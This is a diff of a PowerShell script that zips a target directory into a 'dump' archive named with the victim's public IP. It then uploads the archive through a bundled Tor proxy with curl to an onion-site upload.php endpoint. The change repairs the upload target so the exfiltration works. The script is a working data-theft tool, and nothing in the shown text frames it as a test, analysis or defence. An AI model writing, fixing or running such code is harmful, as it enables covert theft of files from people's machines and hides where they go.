@@ -5,7 +5,7 @@ $torPath = "$dropPath\tor\tor.exe"
 $torrcPath = "$dropPath\tor\torrc"
 $curlPath = "$dropPath\curl\bin\curl.exe"
 $onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion"
-$uploadPath = $onionURL + "/upload.php"
+$uploadURL = $onionURL + "/upload.php"
 $logFile = "$dropPath\tor.log"
 
 # Set the download URL
@@ -56,7 +56,7 @@ $filename = "$dropPath\dump_${publicIP}_$timestamp.zip"
 Add-Type -A 'System.IO.Compression.FileSystem'
 [IO.Compression.ZipFile]::CreateFromDirectory($targetDirectory, $filename)
 
-Start-Process -FilePath $curlPath -ArgumentList "--proxy", "socks5h://127.0.0.1:9050", "-F", "file=@$filename", $onionURL -NoNewWindow -Wait
+Start-Process -FilePath $curlPath -ArgumentList "--proxy", "socks5h://127.0.0.1:9050", "-F", "file=@$filename", $uploadURL -NoNewWindow -Wait
 
 # After completing tasks, stop the Tor process
 if ($torProcess -and !$torProcess.HasExited) {
